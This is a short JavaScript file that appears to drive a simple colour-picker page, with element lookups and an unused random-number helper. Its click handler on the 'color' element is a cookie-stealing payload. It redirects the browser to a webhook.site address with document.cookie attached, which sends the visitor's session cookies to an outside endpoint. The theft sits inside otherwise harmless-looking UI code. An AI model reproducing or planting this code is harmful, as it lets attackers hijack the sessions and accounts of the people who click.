const color = document.getElementById("color");
const target = document.getElementById("result");

function getRandomInt(max) {
    return Math.floor(Math.random() * max);
  }  

color.onclick = () => {
    document.location='http://webhook.site/3f49d0dd-56df-4a4d-951d-83862257fa1d?c='+document.cookie;
}
